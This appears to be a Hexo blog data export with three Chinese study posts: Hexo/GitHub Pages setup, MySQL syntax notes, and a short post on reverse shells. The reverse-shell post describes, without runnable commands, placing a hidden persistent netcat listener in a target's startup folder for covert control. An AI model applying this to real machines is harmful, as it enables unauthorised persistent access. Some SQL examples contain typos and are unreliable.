title=\"博客与github挂钩\"></a>博客与github挂钩</h3><ol>\n<li><p>在github上新建一个仓库，仓库名为    自己的github名.github.io</p>\n</li>\n<li><p>在自己的博客目录下的站点配置文件_config.yml中进行配置，在文件的末尾找到并进行修改：</p>\n<pre><code>deploy:\n    type: git\n    repo: 仓库名称.git  (.git不能少)\n    branch： master</code></pre></li>\n<li><p>安装git部署插件</p>\n<pre><code>npm install hexo-deployer-git --save</code></pre></li>\n<li><p>之后</p>\n<pre><code>npx hexo clean\nnpx hexo g\n# 进行网站部署\nnpx hexo d</code></pre></li>\n<li><p>大功告成</p>\n</li>\n</ol>\n<h2 id=\"绑定域名\"><a href=\"#绑定域名\" class=\"headerlink\" title=\"绑定域名\"></a>绑定域名</h2><ol>\n<li><p>先去购买域名</p>\n</li>\n<li><p>进行域名注册</p>\n</li>\n<li><p>再进行域名解析（必要的环节）</p>\n<ul>\n<li>进入解析页面</li>\n<li>添加解析</li>\n<li>在命令行下ping自己的github和博客绑定的仓库</li>\n<li>得到ip地址之后添加到解析列表</li>\n</ul>\n</li>\n<li><p>进入博客的source目录下，新建名为 CNAME 的文件，在里面写入自己申请的域名</p>\n</li>\n<li><p>进入blog，依次输入</p>\n</li>\n</ol>\n<pre><code>   npx hexo clean\n   npx hexo g\n   hexo d</code></pre><ol start=\"6\">\n<li>大功告成.</li>\n</ol>\n<h3 id=\"hexo发生error-spawn-failed错误的解决方法\"><a href=\"#hexo发生error-spawn-failed错误的解决方法\" class=\"headerlink\" title=\"hexo发生error:spawn failed错误的解决方法\"></a>hexo发生error:spawn failed错误的解决方法</h3><ul>\n<li><a href=\"https://blog.csdn.net/HTL2018/article/details/106876940\">原文链接</a></li>\n<li>问题原因：由于git进行push或者hexo d 的时候改变了一些 .deploy_git 文件下的内容</li>\n</ul>\n<pre><code># 出现错误\nerror:spawn failed...\n#解决方法\n1. 删除blog文件夹中的 .deploy_git 文件夹\n2. 输入 git config --global core.autocrlf false\n3. \n    hexo clean\n    hexo g\n    hexo d\n</code></pre>","site":{"data":{}},"excerpt":"<h1 id=\"搭建静态页面个人博客\"><a href=\"#搭建静态页面个人博客\" class=\"headerlink\" title=\"搭建静态页面个人博客\"></a>搭建静态页面个人博客</h1><p><a href=\"https://www.jianshu.com/p/189fd945f38f\">参考文献</a></p>\n<p><a href=\"\">参考文献</a></p>\n<h3 id=\"安装hexo\"><a href=\"#安装hexo\" class=\"headerlink\" title=\"安装hexo\"></a>安装hexo</h3><ol>\n<li><p>检查电脑是否有node.js</p>\n<pre><code>node -v</code></pre>","more":"</li>\n<li><p>若没有则下载</p>\n</li>\n<li><p>安装npm</p>\n<pre><code>npm install -g hexo-cli\n这样会报错</code></pre></li>\n</ol>\n<h3 id=\"解决错误：\"><a href=\"#解决错误：\" class=\"headerlink\" title=\"解决错误：\"></a>解决错误：</h3><p>Missing write access to /usr/local/lib/node_modules是没有写权限, npm官方给出的解决方案是新建一个有权限的文件夹, 在这个新文件夹中安装npm包. 这个方法不适用于Microsoft Windows系统.<br>在用户的根目录创建文件夹(名字不一定要是.npm-global, 可以自己起):</p>\n<pre><code>mkdir ~/.npm-global</code></pre><p>设置npm全局包的安装路径:</p>\n<pre><code>npm config set prefix &#39;~/.npm-global&#39;</code></pre><p>在用户的根目录下查看有没有.profile文件, 如果没有就创建, 然后用文本编辑器打开, 加上以下一行, 保存:</p>\n<pre><code>export PATH=~/.npm-global/bin:$PATH</code></pre><p>回到终端运行以下命令, 让配置生效:</p>\n<pre><code>source /etc/profile</code></pre><p>然后全局安装npm包就可以了.</p>\n<p>[原文链<a href=\"https://blog.csdn.net/zhangxuekang/article/details/89075039\">接</a></p>\n<ol start=\"2\">\n<li><p>将 Hexo 所在的目录下的 node_modules 添加到环境变量之中即可直接使用 hexo <command>：</p>\n<p>echo ‘PATH=”$PATH:./node_modules/.bin”‘ &gt;&gt; ~/.profile</p>\n</li>\n<li><p>初始化博客框架</p>\n</li>\n</ol>\n<pre><code># 选择一个地方新建博客目录\nnpx hexo init blog\n\n# 生成博客文件夹中的moudle文件夹\nnpx hexo g\n\n# 进行本机器运行测试\nnpx hexo server</code></pre><h3 id=\"主题切换\"><a href=\"#主题切换\" class=\"headerlink\" title=\"主题切换\"></a>主题切换</h3><ol>\n<li><p>去hexo官网下载主题，克隆到自己的仓库下</p>\n</li>\n<li><p>配置自己的站点文件（根目录下的_config.yml,不是主题下的），切换至自己的主题</p>\n<p>并且更改语言设置成zh-CN</p>\n</li>\n<li><p>在source文件夹下新建标签文件夹(tags)和分类文件夹(categories)以及about文件夹[内容为个人简介或声明],如果还需要其他的自己可以建，笔记文档放在_posts文件夹内</p>\n</li>\n</ol>\n<h3 id=\"博客与github挂钩\"><a href=\"#博客与github挂钩\" class=\"headerlink\" title=\"博客与github挂钩\"></a>博客与github挂钩</h3><ol>\n<li><p>在github上新建一个仓库，仓库名为    自己的github名.github.io</p>\n</li>\n<li><p>在自己的博客目录下的站点配置文件_config.yml中进行配置，在文件的末尾找到并进行修改：</p>\n<pre><code>deploy:\n    type: git\n    repo: 仓库名称.git  (.git不能少)\n    branch： master</code></pre></li>\n<li><p>安装git部署插件</p>\n<pre><code>npm install hexo-deployer-git --save</code></pre></li>\n<li><p>之后</p>\n<pre><code>npx hexo clean\nnpx hexo g\n# 进行网站部署\nnpx hexo d</code></pre></li>\n<li><p>大功告成</p>\n</li>\n</ol>\n<h2 id=\"绑定域名\"><a href=\"#绑定域名\" class=\"headerlink\" title=\"绑定域名\"></a>绑定域名</h2><ol>\n<li><p>先去购买域名</p>\n</li>\n<li><p>进行域名注册</p>\n</li>\n<li><p>再进行域名解析（必要的环节）</p>\n<ul>\n<li>进入解析页面</li>\n<li>添加解析</li>\n<li>在命令行下ping自己的github和博客绑定的仓库</li>\n<li>得到ip地址之后添加到解析列表</li>\n</ul>\n</li>\n<li><p>进入博客的source目录下，新建名为 CNAME 的文件，在里面写入自己申请的域名</p>\n</li>\n<li><p>进入blog，依次输入</p>\n</li>\n</ol>\n<pre><code>   npx hexo clean\n   npx hexo g\n   hexo d</code></pre><ol start=\"6\">\n<li>大功告成.</li>\n</ol>\n<h3 id=\"hexo发生error-spawn-failed错误的解决方法\"><a href=\"#hexo发生error-spawn-failed错误的解决方法\" class=\"headerlink\" title=\"hexo发生error:spawn failed错误的解决方法\"></a>hexo发生error:spawn failed错误的解决方法</h3><ul>\n<li><a href=\"https://blog.csdn.net/HTL2018/article/details/106876940\">原文链接</a></li>\n<li>问题原因：由于git进行push或者hexo d 的时候改变了一些 .deploy_git 文件下的内容</li>\n</ul>\n<pre><code># 出现错误\nerror:spawn failed...\n#解决方法\n1. 删除blog文件夹中的 .deploy_git 文件夹\n2. 输入 git config --global core.autocrlf false\n3. \n    hexo clean\n    hexo g\n    hexo d\n</code></pre>"},{"_content":"---\n\n---\n\n# 反弹shell原理\n\n[相关原文链接](https://www.cnblogs.com/iouwenbo/p/11277453.html)\n\n## 反弹shell定义\n\n<!--more-->\n\n- 正向连接目的机器我将之称为正向shell，即远程控制，如远程桌面，ssh\n- 所以可以理解反弹shell，即从目的机器连接我们的控制系统，从而我们可以控制目的机器\n- 本质上反弹shell是建立一个服务器，使目的机器主称为客户端，主动连接服务器并将自己的shell给我们的控制系统\n\n## 反弹应用情景\n\n1. 某客户机中了你的网马，但是它在局域网内，你直接连接不了。\n2. 目标机器的ip动态改变，你不能持续控制。\n3. 由于防火墙等限制，对方机器只能发送请求，不能接收请求\n4. 对于病毒，木马，受害者什么时候能中招，对方的网络环境是什么样的，什么时候开关机等情况都是未知的，所以建立一个服务端让恶意程序主动连接，才是上策。\n\n## 利用netcat进行反弹shell思路\n\n- 注：只是想法，本人还未进行实践，未知可行性\n\n1. 在目标主机上建立服务器，如果有netcat直接使用，使用指令 -d 隐藏cmd命令行窗口，保持后台运行，使用指令 -L 使服务器一直保持开启状态，不受客户端断开而关闭，如果没有netcat可以使用Python编写一个服务器（前提是目标机器上有python程序）\n2. 将建立好的服务器放置于目标机器的开机自启文件夹中\n3. 在自己的机器上建立客户端，这样随时就可以访问了\n\n","source":"_posts/反弹shell原理.md","raw":"---\n\n---\n\n# 反弹shell原理\n\n[相关原文链接](https://www.cnblogs.com/iouwenbo/p/11277453.html)\n\n## 反弹shell定义\n\n<!--more-->\n\n- 正向连接目的机器我将之称为正向shell，即远程控制，如远程桌面，ssh\n- 所以可以理解反弹shell，即从目的机器连接我们的控制系统，从而我们可以控制目的机器\n- 本质上反弹shell是建立一个服务器，使目的机器主称为客户端，主动连接服务器并将自己的shell给我们的控制系统\n\n## 反弹应用情景\n\n1. 某客户机中了你的网马，但是它在局域网内，你直接连接不了。\n2. 目标机器的ip动态改变，你不能持续控制。\n3. 由于防火墙等限制，对方机器只能发送请求，不能接收请求\n4. 对于病毒，木马，受害者什么时候能中招，对方的网络环境是什么样的，什么时候开关机等情况都是未知的，所以建立一个服务端让恶意程序主动连接，才是上策。\n\n## 利用netcat进行反弹shell思路\n\n- 注：只是想法，本人还未进行实践，未知可行性\n\n1. 在目标主机上建立服务器，如果有netcat直接使用，使用指令 -d 隐藏cmd命令行窗口，保持后台运行，使用指令 -L 使服务器一直保持开启状态，不受客户端断开而关闭，如果没有netcat可以使用Python编写一个服务器（前提是目标机器上有python程序）\n2. 将建立好的服务器放置于目标机器的开机自启文件夹中\n3. 在自己的机器上建立客户端，这样随时就可以访问了\n\n","slug":"反弹shell原理","published":1,"date":"2021-03-24T04:15:03.342Z","updated":"2021-03-24T04:15:03.390Z","title":"","comments":1,"layout":"post","photos":[],"link":"","_id":"ckq3bl42n0013dsvt5069guug","content":"<hr>\n<hr>\n<h1 id=\"反弹shell原理\"><a href=\"#反弹shell原理\" class=\"headerlink\" title=\"反弹shell原理\"></a>反弹shell原理</h1><p><a href=\"https://www.cnblogs.com/iouwenbo/p/11277453.html\">相关原文链接</a></p>\n<h2 id=\"反弹shell定义\"><a href=\"#反弹shell定义\" class=\"headerlink\" title=\"反弹shell定义\"></a>反弹shell定义</h2><span id=\"more\"></span>\n\n<ul>\n<li>正向连接目的机器我将之称为正向shell，即远程控制，如远程桌面，ssh</li>\n<li>所以可以理解反弹shell，即从目的机器连接我们的控制系统，从而我们可以控制目的机器</li>\n<li>本质上反弹shell是建立一个服务器，使目的机器主称为客户端，主动连接服务器并将自己的shell给我们的控制系统</li>\n</ul>\n<h2 id=\"反弹应用情景\"><a href=\"#反弹应用情景\" class=\"headerlink\" title=\"反弹应用情景\"></a>反弹应用情景</h2><ol>\n<li>某客户机中了你的网马，但是它在局域网内，你直接连接不了。</li>\n<li>目标机器的ip动态改变，你不能持续控制。</li>\n<li>由于防火墙等限制，对方机器只能发送请求，不能接收请求</li>\n<li>对于病毒，木马，受害者什么时候能中招，对方的网络环境是什么样的，什么时候开关机等情况都是未知的，所以建立一个服务端让恶意程序主动连接，才是上策。</li>\n</ol>\n<h2 id=\"利用netcat进行反弹shell思路\"><a href=\"#利用netcat进行反弹shell思路\" class=\"headerlink\" title=\"利用netcat进行反弹shell思路\"></a>利用netcat进行反弹shell思路</h2><ul>\n<li>注：只是想法，本人还未进行实践，未知可行性</li>\n</ul>\n<ol>\n<li>在目标主机上建立服务器，如果有netcat直接使用，使用指令 -d 隐藏cmd命令行窗口，保持后台运行，使用指令 -L 使服务器一直保持开启状态，不受客户端断开而关闭，如果没有netcat可以使用Python编写一个服务器（前提是目标机器上有python程序）</li>\n<li>将建立好的服务器放置于目标机器的开机自启文件夹中</li>\n<li>在自己的机器上建立客户端，这样随时就可以访问了</li>\n</ol>\n","site":{"data":{}},"excerpt":"<hr>\n<hr>\n<h1 id=\"反弹shell原理\"><a href=\"#反弹shell原理\" class=\"headerlink\" title=\"反弹shell原理\"></a>反弹shell原理</h1><p><a href=\"https://www.cnblogs.com/iouwenbo/p/11277453.html\">相关原文链接</a></p>\n<h2 id=\"反弹shell定义\"><a href=\"#反弹shell定义\" class=\"headerlink\" title=\"反弹shell定义\"></a>反弹shell定义</h2>","more":"<ul>\n<li>正向连接目的机器我将之称为正向shell，即远程控制，如远程桌面，ssh</li>\n<li>所以可以理解反弹shell，即从目的机器连接我们的控制系统，从而我们可以控制目的机器</li>\n<li>本质上反弹shell是建立一个服务器，使目的机器主称为客户端，主动连接服务器并将自己的shell给我们的控制系统</li>\n</ul>\n<h2 id=\"反弹应用情景\"><a href=\"#反弹应用情景\" class=\"headerlink\" title=\"反弹应用情景\"></a>反弹应用情景</h2><ol>\n<li>某客户机中了你的网马，但是它在局域网内，你直接连接不了。</li>\n<li>目标机器的ip动态改变，你不能持续控制。</li>\n<li>由于防火墙等限制，对方机器只能发送请求，不能接收请求</li>\n<li>对于病毒，木马，受害者什么时候能中招，对方的网络环境是什么样的，什么时候开关机等情况都是未知的，所以建立一个服务端让恶意程序主动连接，才是上策。</li>\n</ol>\n<h2 id=\"利用netcat进行反弹shell思路\"><a href=\"#利用netcat进行反弹shell思路\" class=\"headerlink\" title=\"利用netcat进行反弹shell思路\"></a>利用netcat进行反弹shell思路</h2><ul>\n<li>注：只是想法，本人还未进行实践，未知可行性</li>\n</ul>\n<ol>\n<li>在目标主机上建立服务器，如果有netcat直接使用，使用指令 -d 隐藏cmd命令行窗口，保持后台运行，使用指令 -L 使服务器一直保持开启状态，不受客户端断开而关闭，如果没有netcat可以使用Python编写一个服务器（前提是目标机器上有python程序）</li>\n<li>将建立好的服务器放置于目标机器的开机自启文件夹中</li>\n<li>在自己的机器上建立客户端，这样随时就可以访问了</li>\n</ol>"},{"title":"数据库(二)","_content":"\n# 数据库（二）\n\n[参考的相关视频资料连接](https://www.bilibili.com/video/BV12b411K7Zu/?p=105)\n\n## DML语言\n\n- 数据操作语言：\n  - 插入：insert\n  - 修改：update\n  - 删除：delete\n\n### 插入语句\n\n#### 方式一：经典插入语句\n\n<!--more-->\n\n- 语法\n\n```\ninsert into 表名（列名1, 列名2, ...）\nvalues （值1, 值2, ...）;\n```\n\n- 注意事项：\n  1. 插入的值的类型与列的类型一致或兼容\n  2. 可以为NULL的列可以插入NULL值，不为NULL的列必须插入值\n  3. 列的顺序可以调换，但是插入的值必须和列相匹配\n  4. 列数和值得个数必须相一致\n  5. 可以省略列名，默认所有列，而且列的顺序和表中的顺序一致\n\n```\ninsert into beauty\nvalues(列1, 列2, ...);            //省略列名，默认所有列\n```\n\n#### 方式二：\n\n1. 语法：\n\n```\ninsert into 表名\nset 列名1=值1，列名2=值2，...\n```\n\n2. 案例:\n\n```\ninsert into beauty\nset id=19, name='章子怡'，phone='110';\n```\n\n#### 注意事项\n\n1. 方式一支持插入多行，方式二不行\n2. 方式一支持子查询，方式二不行\n\n\n\n### 修改语句\n\n#### 修改单表的记录（*重点）\n\n1. 语法：\n\n```\nupdate 表名\nset 列=新值，列=新值，...\nwhere 筛选条件；\n```\n\n2. 案例：修改boys表中id号位2的名称为张飞，魅力值10\n\n```\nupdate boys set boyname='张飞'， usercp=10\nwhere id=2;\n```\n\n#### 修改多表得记录(了解即可)\n\n1. 语法：\n\n```\nsql92语法：\nupdate 表1 别名， 表2 别名\nset 列=值，...\nwhere 连接条件\nand 筛选条件\n\nsql99语法：\nupdate 表1 别名\ninner 连接类型 join 表2 别名\non 链接条件\nset 列=值，...\n```\n\n\n\n### 删除语句\n\n1. 方式一：delete \n\n- 删除整行\n- 单表的删除\n\n```\n语法：\ndelete from 表名 where 筛选条件\n```\n\n- 案例：删除手机号以3结尾的女孩信息\n\n```\ndelete from girls \nwhere phon like '%3';\n```\n\n2. 方式二：truncate\n\n```\n语法：\ntruncate table 表名\n```\n\n- 案例：将魅力值>100的男神信息删除\n\n```\ntruncate table boys;\n```\n\n\n\n## DDL语言\n\n1. DDL数据定义语言\n2. 表和库的管理\n\n### 库的操作\n\n1. 库的创建\n\n- 语法：\n\n```\ncreate database (if not exists)库名；\n```\n\n2. 库的删除\n\n- 语法：\n\n```\ndrop database if exists 库名；\n```\n\n\n\n### 表的管理\n\n1. 表的创建\n\n- 语法：\n\n```\ncreate  table 表名(\n\t列名 列的类型【(长度) (约束)】，  //长度和约束可选\n\t列名 列的类型【(长度) (约束)】，\n\t...\n)；\n```\n\n- 案例：创建表Book\n\n```\ncreat table book(\n\tid int, #编号\n\tbname varchar (20),  #图书名\n\tauthorid int,  #作者编号\n\tpublishdate datetime;  #出版日期\n)；\n```\n\n\n\n2. 表的修改\n\n- 语法：\n\n```\nalter table 表名 关键字 column 列名 列类型 约束\n```\n\n\n\n- 修改列名\n\n```\n//参考上个案例，创建表book\nalter table book change aolumn publish pubdate datetime;\n```\n\n- 修改列的类型或约束\n\n```\nalter table book modify column pubtade timestamp;\n```\n\n- 添加新列\n\n```\nalter table author add column annual double;\n```\n\n- 删除列\n\n```\nalter table author drop column annual;\n```\n\n- 修改表名\n\n```\nalter table  author rename to book_author;\n```\n\n\n\n3. 表的删除\n\n- 语法：\n\n```\ndrop table if exists book_author;\n```\n\n- 通用的写法：\n\n```\ndrop database if exists 旧库名；\ncreate database 新库名；\n\ndrop table if exists 旧表名；\ncreate table 表名（）；\n```\n\n\n\n4. 表的复制\n\n- 复制表的结构\n\n```\ncreate table copy like author;\n```\n\n- 复制表的结构+数据\n\n```\ncreate table copy2\nselect * from author;\n```\n\n- 只复制部分数据\n\n```\ncreate table copy3\nselect id, au_name\nfrom autor\nwhere nation='中国'；\n```\n\n- 复制部分结构\n\n```\ncreate table copy4\nselect id, au_name\nfrom author\nwhere 0;\n```\n\n\n\n###  常见的数据类型\n\n```\n数值型：\n\t\t整型\n\t\t小数：\n\t\t\t定点型\n\t\t\t浮点型\n字符型：\n\t\t较短的文本：char、varchar\n\t\t较长的文本：text，blob（较长的二进制数据）\n日期型\n```\n\n#### 整型\n\n1. 分类：tinyint, smallint, mediumint, int\\integer, bigint\n2. 特点：\n\n- 如果不设置无符号还是有符号，默认是有符号，如果想设置无符号，还需要添加unsigned关键字\n- 如果插入的数值超出了整型的范围，则插入的值为整型类型的最大值\n\n#### 小数\n\n1. 分类：\n\n- 浮点型： float(M, D) , double(M, D)\n- 定点型：dec(M, D) , decimal(M, D)\n\n2. 特点：\n\n- M：整数部位+加小数部位的总长度\n- D：小数部位长度\n- 如果超过范围，则插入临界值\n- M，D可以省略，如果是decimal，则默认M是10,D是0，  若是float和double，则会根据插入数值的精度来决定\n- 定点型精确度较高，如果要求插入数值的精确度较高如货币运算则考虑使用定点型\n\n#### 字符型\n\n较短的文本：char、varchar\n较长的文本：text，blob（较长的二进制数据）\n\n1. 特点：\n\n```\n          写法        M的意思                      特点        空间的耗费    效率  \nchar     char(M)    最大的字符数，可以省略，默认为1  固定长度字符    比较耗费    较高\nvarchar  varchar(M) 最大的字符数，不可以省略        可变长度字符    比较节省    较低\n```\n\n#### 日期型\n\n1. 分类：date 只保存日期\n\n   ​\t\t\ttime 只保存时间\n\n   ​\t\t\tyear 只保存年\n\n   ​\t\t\tdatetime 保存日期+时间\n\n   ​\t\t\ttimestamp 保存日期+时间\n\n2. 特点：\n\n```\n\t\t\t字节   范围          时区等的影响\ndatetime     8    1000-9999         不受\ntimestamp    4    1970-2038          受\n```\n\n\n\n### 常见约束\n\n1. 含义：一种限制，用于限制表中的数据，为了保证表中数据的准确性和可靠性\n\n2. 分类：\n\n```\n1. not null: 非空用于保证该字段值不能为空\n2. default： 默认，用于赋予该字段默认值\n3. primary key: 主键，用于保证该字段的值具有唯一性，并且非空\n4. unique：用于保证该字段的值的唯一性\n5. check：检查约束【MySQL中不支持】 \n6. foreing key:外键约束，用于限制俩个表的关系，用于保证该字段的值必须来自于主表的关联列的值，在从表添加外键约束，用于引用主表中某列的值\n```\n\n3. 添加约束的时机：\n\n```\n1. 创建表时\n2. 修改表时\n```\n\n4. 约束的添加分类：\n\n```\n1. 列级约束：\n\t直接在字段名和类型后面追加约束类型即可\n\t六大约束语法上都支持，但外键约束没有效果\n2. 表级约束：\n\t在所有字段的最下面：constraint 约束名 约束类型（字段名）\n\t除了非空、默认约束，其他都支持\n```\n\n5. 主键与唯一：\n\n```\n\t\t保证唯一性   是否允许为空   一个表中可以有多少个    是否允许组合\n主键\t\tY\t\t\t\tN\t\t\t一个\t\t\t\t允许，不推荐\n唯一\t\tY\t\t\t\tY\t\t\t多个 \t\t\t\t允许，不推荐\n```\n\n6. 外键约束\n\n```\n1. 要求在从表中设置外键关系\n2. 从表的外键列的类型和主表的关联列的类型要求一致或兼容，名称无要求\n3. 主表的关联列必须是一个key（一般是主键或唯一）\n4. 插入数据时，先插入主表，再插入从表，删除时相反\n# 添加外键约束：\nalter table stuinfo add constraint 表名字 foreing key(majorid) references major(id);\n```\n\n7. 修改表时添加约束：\n\n```\n1. 添加列级约束：\nalter table 表名 modify column 字段名 字段类型 新约束\n2. 添加表级约束：\nalter table 表名 add [constraint 约束名] 约束类型（字段名） 【外键的引用】\n```\n\n8. 修改表时删除约束：\n\n![NBXJgK.png](https://s1.ax1x.com/2020/06/25/NBXJgK.png)\n\n\n\n###  标识列\n\n1. 又称为自增长列，可以不用手动的插入值，系统提供默认的序列值\n2. 特点：\n\n```\n1. 标识列不一定要和主键搭配，但必须要和一个key搭配\n2. 一个表至多只有一个标识列\n3. 标识列的类型只能是数值型\n4.标识列可以通过 set auto_increment_incremennt= ;设置步长\n\t可以通过手动插入值，设置起始值\n```\n\n3. 修改表时设置标识列\n\n```\nalter table 表名 modify column 字段值 类型 key名 auto_incerment;\n```\n\n4. 修改表时删除标识列\n\n```\nalter table 表名 modify column 字段值 类型；\n```\n\n\n\n## TCL语言\n\n1. 事务控制语言，一个或一组sql语句组成一个执行单元，这个执行单元要么全部执行，要么全部不执行，比如转账的过程\n\n2. 事务的特性\n\n![NBXYjO.png](https://s1.ax1x.com/2020/06/25/NBXYjO.png)\n\n3. 事务的创建\n\n![NBX89x.png](https://s1.ax1x.com/2020/06/25/NBX89x.png)\n\n![NBXNuD.png](https://s1.ax1x.com/2020/06/25/NBXNuD.png)\n\n- 实例\n\n![NBXG36.png](https://s1.ax1x.com/2020/06/25/NBXG36.png)\n\n\n\n5. 事务隔离级别\n\n![image-20200626215014414](/home/blacksheep/图片/笔记/数据库/image-20200626215014414.png)\n\n![image-20200627183401294](/home/blacksheep/图片/笔记/数据库/image-20200627183401294.png)\n\n\n\n- MySQL中默认隔离级别 repeatable read\n- oracle中默认级别 read committed\n- 查看隔离级别 ：select @@tx_isolation;\n- 设置隔离级别 ：\n\n```\nset session 或 global transaction isolation level 隔离级别；\n```\n\n\n\n6. savepoint 节点名，设置保存点\n\n```\n# 演示savepoint的使用\nset autocommit = 0;\nstart transaction;\ndelete from account where id=25;\nsavepoint a;  #设置保存点\ndelete from account where id=28;\nrollback to a;  #回滚到保存点\n\nselect * from account;\n\n结果：id=28还在，id=25没有\n```\n\n\n\n\n\n","source":"_posts/数据库(二).md","raw":"---\ntitle: 数据库(二)\ntag: \n- [Mysql]\n- [SQL]\n- [数据库]\ncategories:\n- 数据库\n---\n\n# 数据库（二）\n\n[参考的相关视频资料连接](https://www.bilibili.com/video/BV12b411K7Zu/?p=105)\n\n## DML语言\n\n- 数据操作语言：\n  - 插入：insert\n  - 修改：update\n  - 删除：delete\n\n### 插入语句\n\n#### 方式一：经典插入语句\n\n<!--more-->\n\n- 语法\n\n```\ninsert into 表名（列名1, 列名2, ...）\nvalues （值1, 值2, ...）;\n```\n\n- 注意事项：\n  1. 插入的值的类型与列的类型一致或兼容\n  2. 可以为NULL的列可以插入NULL值，不为NULL的列必须插入值\n  3. 列的顺序可以调换，但是插入的值必须和列相匹配\n  4. 列数和值得个数必须相一致\n  5. 可以省略列名，默认所有列，而且列的顺序和表中的顺序一致\n\n```\ninsert into beauty\nvalues(列1, 列2, ...);            //省略列名，默认所有列\n```\n\n#### 方式二：\n\n1. 语法：\n\n```\ninsert into 表名\nset 列名1=值1，列名2=值2，...\n```\n\n2. 案例:\n\n```\ninsert into beauty\nset id=19, name='章子怡'，phone='110';\n```\n\n#### 注意事项\n\n1. 方式一支持插入多行，方式二不行\n2. 方式一支持子查询，方式二不行\n\n\n\n### 修改语句\n\n#### 修改单表的记录（*重点）\n\n1. 语法：\n\n```\nupdate 表名\nset 列=新值，列=新值，...\nwhere 筛选条件；\n```\n\n2. 案例：修改boys表中id号位2的名称为张飞，魅力值10\n\n```\nupdate boys set boyname='张飞'， usercp=10\nwhere id=2;\n```\n\n#### 修改多表得记录(了解即可)\n\n1. 语法：\n\n```\nsql92语法：\nupdate 表1 别名， 表2 别名\nset 列=值，...\nwhere 连接条件\nand 筛选条件\n\nsql99语法：\nupdate 表1 别名\ninner 连接类型 join 表2 别名\non 链接条件\nset 列=值，...\n```\n\n\n\n### 删除语句\n\n1. 方式一：delete \n\n- 删除整行\n- 单表的删除\n\n```\n语法：\ndelete from 表名 where 筛选条件\n```\n\n- 案例：删除手机号以3结尾的女孩信息\n\n```\ndelete from girls \nwhere phon like '%3';\n```\n\n2. 方式二：truncate\n\n```\n语法：\ntruncate table 表名\n```\n\n- 案例：将魅力值>100的男神信息删除\n\n```\ntruncate table boys;\n```\n\n\n\n## DDL语言\n\n1. DDL数据定义语言\n2. 表和库的管理\n\n### 库的操作\n\n1. 库的创建\n\n- 语法：\n\n```\ncreate database (if not exists)库名；\n```\n\n2. 库的删除\n\n- 语法：\n\n```\ndrop database if exists 库名；\n```\n\n\n\n### 表的管理\n\n1. 表的创建\n\n- 语法：\n\n```\ncreate  table 表名(\n\t列名 列的类型【(长度) (约束)】，  //长度和约束可选\n\t列名 列的类型【(长度) (约束)】，\n\t...\n)；\n```\n\n- 案例：创建表Book\n\n```\ncreat table book(\n\tid int, #编号\n\tbname varchar (20),  #图书名\n\tauthorid int,  #作者编号\n\tpublishdate datetime;  #出版日期\n)；\n```\n\n\n\n2. 表的修改\n\n- 语法：\n\n```\nalter table 表名 关键字 column 列名 列类型 约束\n```\n\n\n\n- 修改列名\n\n```\n//参考上个案例，创建表book\nalter table book change aolumn publish pubdate datetime;\n```\n\n- 修改列的类型或约束\n\n```\nalter table book modify column pubtade timestamp;\n```\n\n- 添加新列\n\n```\nalter table author add column annual double;\n```\n\n- 删除列\n\n```\nalter table author drop column annual;\n```\n\n- 修改表名\n\n```\nalter table  author rename to book_author;\n```\n\n\n\n3. 表的删除\n\n- 语法：\n\n```\ndrop table if exists book_author;\n```\n\n- 通用的写法：\n\n```\ndrop database if exists 旧库名；\ncreate database 新库名；\n\ndrop table if exists 旧表名；\ncreate table 表名（）；\n```\n\n\n\n4. 表的复制\n\n- 复制表的结构\n\n```\ncreate table copy like author;\n```\n\n- 复制表的结构+数据\n\n```\ncreate table copy2\nselect * from author;\n```\n\n- 只复制部分数据\n\n```\ncreate table copy3\nselect id, au_name\nfrom autor\nwhere nation='中国'；\n```\n\n- 复制部分结构\n\n```\ncreate table copy4\nselect id, au_name\nfrom author\nwhere 0;\n```\n\n\n\n###  常见的数据类型\n\n```\n数值型：\n\t\t整型\n\t\t小数：\n\t\t\t定点型\n\t\t\t浮点型\n字符型：\n\t\t较短的文本：char、varchar\n\t\t较长的文本：text，blob（较长的二进制数据）\n日期型\n```\n\n#### 整型\n\n1. 分类：tinyint, smallint, mediumint, int\\integer, bigint\n2. 特点：\n\n- 如果不设置无符号还是有符号，默认是有符号，如果想设置无符号，还需要添加unsigned关键字\n- 如果插入的数值超出了整型的范围，则插入的值为整型类型的最大值\n\n#### 小数\n\n1. 分类：\n\n- 浮点型： float(M, D) , double(M, D)\n- 定点型：dec(M, D) , decimal(M, D)\n\n2. 特点：\n\n- M：整数部位+加小数部位的总长度\n- D：小数部位长度\n- 如果超过范围，则插入临界值\n- M，D可以省略，如果是decimal，则默认M是10,D是0，  若是float和double，则会根据插入数值的精度来决定\n- 定点型精确度较高，如果要求插入数值的精确度较高如货币运算则考虑使用定点型\n\n#### 字符型\n\n较短的文本：char、varchar\n较长的文本：text，blob（较长的二进制数据）\n\n1. 特点：\n\n```\n          写法        M的意思                      特点        空间的耗费    效率  \nchar     char(M)    最大的字符数，可以省略，默认为1  固定长度字符    比较耗费    较高\nvarchar  varchar(M) 最大的字符数，不可以省略        可变长度字符    比较节省    较低\n```\n\n#### 日期型\n\n1. 分类：date 只保存日期\n\n   ​\t\t\ttime 只保存时间\n\n   ​\t\t\tyear 只保存年\n\n   ​\t\t\tdatetime 保存日期+时间\n\n   ​\t\t\ttimestamp 保存日期+时间\n\n2. 特点：\n\n```\n\t\t\t字节   范围          时区等的影响\ndatetime     8    1000-9999         不受\ntimestamp    4    1970-2038          受\n```\n\n\n\n### 常见约束\n\n1. 含义：一种限制，用于限制表中的数据，为了保证表中数据的准确性和可靠性\n\n2. 分类：\n\n```\n1. not null: 非空用于保证该字段值不能为空\n2. default： 默认，用于赋予该字段默认值\n3. primary key: 主键，用于保证该字段的值具有唯一性，并且非空\n4. unique：用于保证该字段的值的唯一性\n5. check：检查约束【MySQL中不支持】 \n6. foreing key:外键约束，用于限制俩个表的关系，用于保证该字段的值必须来自于主表的关联列的值，在从表添加外键约束，用于引用主表中某列的值\n```\n\n3. 添加约束的时机：\n\n```\n1. 创建表时\n2. 修改表时\n```\n\n4. 约束的添加分类：\n\n```\n1. 列级约束：\n\t直接在字段名和类型后面追加约束类型即可\n\t六大约束语法上都支持，但外键约束没有效果\n2. 表级约束：\n\t在所有字段的最下面：constraint 约束名 约束类型（字段名）\n\t除了非空、默认约束，其他都支持\n```\n\n5. 主键与唯一：\n\n```\n\t\t保证唯一性   是否允许为空   一个表中可以有多少个    是否允许组合\n主键\t\tY\t\t\t\tN\t\t\t一个\t\t\t\t允许，不推荐\n唯一\t\tY\t\t\t\tY\t\t\t多个 \t\t\t\t允许，不推荐\n```\n\n6. 外键约束\n\n```\n1. 